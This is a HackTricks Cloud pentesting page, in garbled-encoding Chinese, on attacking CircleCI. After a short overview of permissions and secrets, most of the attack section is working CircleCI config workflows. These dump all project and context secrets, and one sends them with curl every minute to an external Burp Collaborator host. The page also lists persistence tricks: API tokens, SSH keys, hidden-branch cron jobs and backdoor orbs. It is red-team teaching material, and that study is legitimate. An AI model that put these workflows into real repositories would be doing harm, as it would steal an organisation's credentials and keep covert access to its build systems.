# CircleCI å®‰å…¨æ€§

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºè‹±é›„çº§äººç‰©ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) æ˜¯ä¸€ä¸ªæŒç»­é›†æˆå¹³å°ï¼Œæ‚¨å¯ä»¥åœ¨å…¶ä¸­**å®šä¹‰æ¨¡æ¿**ï¼ŒæŒ‡ç¤ºå®ƒä½•æ—¶ä»¥åŠå¦‚ä½•å¤„ç†ä¸€äº›ä»£ç ã€‚è¿™æ ·ï¼Œæ‚¨å¯ä»¥ç›´æ¥**ä»æ‚¨çš„ä»“åº“ä¸»åˆ†æ”¯**è‡ªåŠ¨åŒ–æµ‹è¯•æˆ–éƒ¨ç½²ã€‚

## æƒé™

**CircleCI** **ç»§æ‰¿äº†**ä¸ç™»å½•è´¦æˆ·ç›¸å…³çš„ github å’Œ bitbucket çš„æƒé™ã€‚\
åœ¨æˆ‘çš„æµ‹è¯•ä¸­ï¼Œæˆ‘æ£€æŸ¥äº†åªè¦æ‚¨åœ¨ github ä¸Šå¯¹ä»“åº“æœ‰**å†™æƒé™**ï¼Œæ‚¨å°±èƒ½å¤Ÿ**ç®¡ç† CircleCI ä¸­çš„é¡¹ç›®è®¾ç½®**ï¼ˆè®¾ç½®æ–°çš„ ssh å¯†é’¥ï¼Œè·å–é¡¹ç›® api å¯†é’¥ï¼Œåˆ›å»ºå¸¦æœ‰æ–° CircleCI é…ç½®çš„æ–°åˆ†æ”¯...ï¼‰ã€‚

ç„¶è€Œï¼Œæ‚¨éœ€è¦æ˜¯ä¸€ä¸ª**ä»“åº“ç®¡ç†å‘˜**æ‰èƒ½**å°†ä»“åº“è½¬æ¢ä¸º CircleCI é¡¹ç›®**ã€‚

## ç¯å¢ƒå˜é‡å’Œç§˜å¯†

æ ¹æ®[**æ–‡æ¡£**](https://circleci.com/docs/2.0/env-vars/)ï¼Œåœ¨å·¥ä½œæµä¸­æœ‰ä¸åŒçš„æ–¹å¼æ¥**åŠ è½½ç¯å¢ƒå˜é‡ä¸­çš„å€¼**ã€‚

### å†…ç½®ç¯å¢ƒå˜é‡

CircleCI è¿è¡Œçš„æ¯ä¸ªå®¹å™¨å°†å§‹ç»ˆå…·æœ‰[**æ–‡æ¡£ä¸­å®šä¹‰çš„ç‰¹å®šç¯å¢ƒå˜é‡**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables)ï¼Œå¦‚ `CIRCLE_PR_USERNAME`ã€`CIRCLE_PROJECT_REPONAME` æˆ– `CIRCLE_USERNAME`ã€‚

### æ˜æ–‡

æ‚¨å¯ä»¥åœ¨**å‘½ä»¤**ä¸­ä»¥æ˜æ–‡å£°æ˜å®ƒä»¬ï¼š
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
ä½ å¯ä»¥åœ¨**è¿è¡Œç¯å¢ƒ**ä¸­ä»¥æ˜æ–‡å£°æ˜å®ƒä»¬ï¼š
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
ä½ å¯ä»¥åœ¨**æ„å»ºä½œä¸šç¯å¢ƒ**ä¸­æ˜æ–‡å£°æ˜å®ƒä»¬ï¼š
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
ä½ å¯ä»¥åœ¨**å®¹å™¨çš„ç¯å¢ƒ**ä¸­ä»¥æ˜æ–‡å£°æ˜å®ƒä»¬ï¼š
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### é¡¹ç›®å¯†é’¥

è¿™äº›æ˜¯**å¯†é’¥**ï¼Œåªèƒ½è¢«**é¡¹ç›®**ï¼ˆ**ä»»ä½•åˆ†æ”¯**ï¼‰**è®¿é—®**ã€‚\
æ‚¨å¯ä»¥åœ¨ _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_ ä¸­çœ‹åˆ°å®ƒä»¬çš„**å£°æ˜**ã€‚

![](<../.gitbook/assets/image (50).png>)

{% hint style="danger" %}
"**å¯¼å…¥å˜é‡**" åŠŸèƒ½å…è®¸å°†**å…¶ä»–é¡¹ç›®çš„å˜é‡å¯¼å…¥**åˆ°æ­¤é¡¹ç›®ä¸­ã€‚
{% endhint %}

### ä¸Šä¸‹æ–‡å¯†é’¥

è¿™äº›æ˜¯**ç»„ç»‡èŒƒå›´å†…**çš„å¯†é’¥ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ**ä»»ä½•ä»“åº“**éƒ½èƒ½å¤Ÿè®¿é—®å­˜å‚¨åœ¨æ­¤å¤„çš„**ä»»ä½•å¯†é’¥**ï¼š

![](<../.gitbook/assets/image (80).png>)

{% hint style="success" %}
ç„¶è€Œï¼Œè¯·æ³¨æ„ï¼Œå¯ä»¥**é€‰æ‹©ä¸åŒçš„ç»„**ï¼ˆè€Œä¸æ˜¯æ‰€æœ‰æˆå‘˜ï¼‰ï¼Œ**åªå…è®¸ç‰¹å®šäººå‘˜è®¿é—®å¯†é’¥**ã€‚\
è¿™ç›®å‰æ˜¯**æé«˜å¯†é’¥å®‰å…¨æ€§**çš„æœ€ä½³æ–¹æ³•ä¹‹ä¸€ï¼Œä¸å…è®¸æ‰€æœ‰äººè®¿é—®ï¼Œè€Œåªå…è®¸æŸäº›äººè®¿é—®ã€‚
{% endhint %}

## æ”»å‡»

### æœç´¢æ˜æ–‡å¯†é’¥

å¦‚æœæ‚¨æœ‰**è®¿é—®VCS**ï¼ˆå¦‚githubï¼‰çš„æƒé™ï¼Œè¯·æ£€æŸ¥**æ¯ä¸ªä»“åº“çš„æ¯ä¸ªåˆ†æ”¯**ä¸Šçš„æ–‡ä»¶ `.circleci/config.yml`ï¼Œå¹¶**æœç´¢**å¯èƒ½å­˜å‚¨åœ¨å…¶ä¸­çš„**æ˜æ–‡å¯†é’¥**ã€‚

### å¯†é’¥ç¯å¢ƒå˜é‡å’Œä¸Šä¸‹æ–‡æšä¸¾

æ£€æŸ¥ä»£ç ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°åœ¨æ¯ä¸ª `.circleci/config.yml` æ–‡ä»¶ä¸­è¢«**ä½¿ç”¨**çš„**æ‰€æœ‰å¯†é’¥åç§°**ã€‚æ‚¨è¿˜å¯ä»¥ä»è¿™äº›æ–‡ä»¶ä¸­è·å–**ä¸Šä¸‹æ–‡åç§°**ï¼Œæˆ–è€…åœ¨ç½‘ç»œæ§åˆ¶å°ä¸­æ£€æŸ¥å®ƒä»¬ï¼š_https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_ã€‚

### æ³„éœ²é¡¹ç›®å¯†é’¥

{% hint style="warning" %}
ä¸ºäº†**æ³„éœ²æ‰€æœ‰**é¡¹ç›®å’Œä¸Šä¸‹æ–‡**å¯†é’¥**ï¼Œæ‚¨**åªéœ€**å¯¹æ•´ä¸ªgithubç»„ç»‡ä¸­çš„**ä»»ä½•ä¸€ä¸ªä»“åº“**æ‹¥æœ‰**å†™**æƒé™ï¼ˆ_å¹¶ä¸”æ‚¨çš„è´¦æˆ·å¿…é¡»æœ‰æƒè®¿é—®ä¸Šä¸‹æ–‡ï¼Œä½†é»˜è®¤æƒ…å†µä¸‹æ¯ä¸ªäººéƒ½å¯ä»¥è®¿é—®æ¯ä¸ªä¸Šä¸‹æ–‡_ï¼‰ã€‚
{% endhint %}

{% hint style="danger" %}
"**å¯¼å…¥å˜é‡**" åŠŸèƒ½å…è®¸å°†**å…¶ä»–é¡¹ç›®çš„å˜é‡å¯¼å…¥**åˆ°æ­¤é¡¹ç›®ä¸­ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥**å¯¼å…¥æ‰€æœ‰ä»“åº“çš„æ‰€æœ‰é¡¹ç›®å˜é‡**ï¼Œç„¶å**ä¸€èµ·æ³„éœ²æ‰€æœ‰å˜é‡**ã€‚
{% endhint %}

æ‰€æœ‰é¡¹ç›®å¯†é’¥å§‹ç»ˆè®¾ç½®åœ¨ä½œä¸šçš„ç¯å¢ƒå˜é‡ä¸­ï¼Œå› æ­¤åªéœ€è°ƒç”¨ env å¹¶å°†å…¶ä»¥ base64 å½¢å¼æ··æ·†ï¼Œå°±å¯ä»¥åœ¨**å·¥ä½œæµç½‘ç»œæ—¥å¿—æ§åˆ¶å°**ä¸­æ³„éœ²å¯†é’¥ï¼š
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
å¦‚æœæ‚¨**æ— æ³•è®¿é—®ç½‘ç»œæ§åˆ¶å°**ï¼Œä½†æ‚¨**å¯ä»¥è®¿é—®ä»“åº“**ï¼Œå¹¶ä¸”æ‚¨çŸ¥é“æ­£åœ¨ä½¿ç”¨CircleCIï¼Œæ‚¨å¯ä»¥ç®€å•åœ°**åˆ›å»ºä¸€ä¸ªå·¥ä½œæµç¨‹**ï¼Œè¯¥å·¥ä½œæµç¨‹**æ¯åˆ†é’Ÿè§¦å‘ä¸€æ¬¡**ï¼Œå¹¶ä¸”å°†**æ³„éœ²çš„ç§˜å¯†å‘é€åˆ°å¤–éƒ¨åœ°å€**ï¼š
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### æ³„éœ²ä¸Šä¸‹æ–‡å¯†é’¥

æ‚¨éœ€è¦**æŒ‡å®šä¸Šä¸‹æ–‡åç§°**ï¼ˆè¿™ä¹Ÿå°†æ³„éœ²é¡¹ç›®å¯†é’¥ï¼‰ï¼š
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
å¦‚æœæ‚¨**æ— æ³•è®¿é—®ç½‘ç»œæ§åˆ¶å°**ï¼Œä½†æ‚¨**å¯ä»¥è®¿é—®ä»“åº“**ï¼Œå¹¶ä¸”æ‚¨çŸ¥é“æ­£åœ¨ä½¿ç”¨CircleCIï¼Œæ‚¨å¯ä»¥ç®€å•åœ°**ä¿®æ”¹ä¸€ä¸ªå·¥ä½œæµ**ï¼Œè¯¥å·¥ä½œæµ**æ¯åˆ†é’Ÿè§¦å‘ä¸€æ¬¡**ï¼Œå¹¶ä¸”**å°†ç§˜å¯†æ•°æ®æ³„éœ²åˆ°å¤–éƒ¨åœ°å€**ï¼š
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
ä»…åœ¨ä»“åº“ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„ `.circleci/config.yml` **å¹¶ä¸è¶³ä»¥è§¦å‘ circleci æ„å»º**ã€‚æ‚¨éœ€è¦åœ¨ circleci æ§åˆ¶å°ä¸­**å°†å…¶å¯ç”¨ä¸ºé¡¹ç›®**ã€‚
{% endhint %}

### é€ƒé€¸åˆ°äº‘ç«¯

**CircleCI** å…è®¸æ‚¨é€‰æ‹©åœ¨**ä»–ä»¬çš„æœºå™¨æˆ–æ‚¨è‡ªå·±çš„æœºå™¨ä¸Šè¿è¡Œæ„å»º**ã€‚\
é»˜è®¤æƒ…å†µä¸‹ï¼Œä»–ä»¬çš„æœºå™¨ä½äº GCPï¼Œèµ·åˆæ‚¨å¯èƒ½æ‰¾ä¸åˆ°ä»»ä½•ç›¸å…³ä¿¡æ¯ã€‚ç„¶è€Œï¼Œå¦‚æœå—å®³è€…åœ¨**ä»–ä»¬è‡ªå·±çš„æœºå™¨ä¸Šè¿è¡Œä»»åŠ¡ï¼ˆå¯èƒ½åœ¨äº‘ç¯å¢ƒä¸­ï¼‰**ï¼Œæ‚¨å¯èƒ½ä¼šå‘ç°ä¸€ä¸ªå¸¦æœ‰æœ‰è¶£ä¿¡æ¯çš„**äº‘å…ƒæ•°æ®ç«¯ç‚¹**ã€‚

è¯·æ³¨æ„ï¼Œåœ¨å‰é¢çš„ä¾‹å­ä¸­ï¼Œä¸€åˆ‡éƒ½æ˜¯åœ¨ docker å®¹å™¨å†…å¯åŠ¨çš„ï¼Œä½†æ‚¨ä¹Ÿå¯ä»¥**è¯·æ±‚å¯åŠ¨ä¸€ä¸ª VM æœºå™¨**ï¼ˆå¯èƒ½æ‹¥æœ‰ä¸åŒçš„äº‘æƒé™ï¼‰ï¼š
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
æˆ–è€…æ˜¯ä¸€ä¸ªå¯ä»¥è®¿é—®è¿œç¨‹dockeræœåŠ¡çš„dockerå®¹å™¨ï¼š
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### æŒä¹…æ€§

* å¯ä»¥åœ¨ CircleCI ä¸­**åˆ›å»ºç”¨æˆ·ä»¤ç‰Œ**ä»¥ä½¿ç”¨ç”¨æˆ·è®¿é—®æƒé™è®¿é—® API ç«¯ç‚¹ã€‚
* _https://app.circleci.com/settings/user/tokens_
* å¯ä»¥**åˆ›å»ºé¡¹ç›®ä»¤ç‰Œ**ä»¥ä½¿ç”¨èµ‹äºˆä»¤ç‰Œçš„æƒé™è®¿é—®é¡¹ç›®ã€‚
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* å¯ä»¥å‘é¡¹ç›®ä¸­**æ·»åŠ  SSH å¯†é’¥**ã€‚
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* å¯ä»¥åœ¨ä¸€ä¸ªæ„æ–™ä¹‹å¤–çš„é¡¹ç›®ä¸­çš„éšè—åˆ†æ”¯**åˆ›å»ºä¸€ä¸ª cron ä½œä¸š**ï¼Œè¯¥ä½œä¸šæ¯å¤©éƒ½ä¼š**æ³„éœ²**æ‰€æœ‰**ä¸Šä¸‹æ–‡ç¯å¢ƒå˜é‡**ã€‚
* æˆ–è€…ç”šè‡³åœ¨ä¸€ä¸ªåˆ†æ”¯ä¸­åˆ›å»º/ä¿®æ”¹ä¸€ä¸ªå·²çŸ¥ä½œä¸šï¼Œå®ƒå°†æ¯å¤©**æ³„éœ²**æ‰€æœ‰ä¸Šä¸‹æ–‡å’Œ**é¡¹ç›®ç§˜å¯†**ã€‚
* å¦‚æœä½ æ˜¯ github æ‹¥æœ‰è€…ï¼Œä½ å¯ä»¥**å…è®¸æœªéªŒè¯çš„ orbs** å¹¶é…ç½®ä¸€ä¸ªä½œä¸º**åé—¨**çš„ä½œä¸šã€‚
* ä½ å¯ä»¥åœ¨æŸä¸ªä»»åŠ¡ä¸­æ‰¾åˆ°ä¸€ä¸ª**å‘½ä»¤æ³¨å…¥æ¼æ´**å¹¶é€šè¿‡ä¿®æ”¹å…¶å€¼**æ³¨å…¥å‘½ä»¤**ã€‚

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
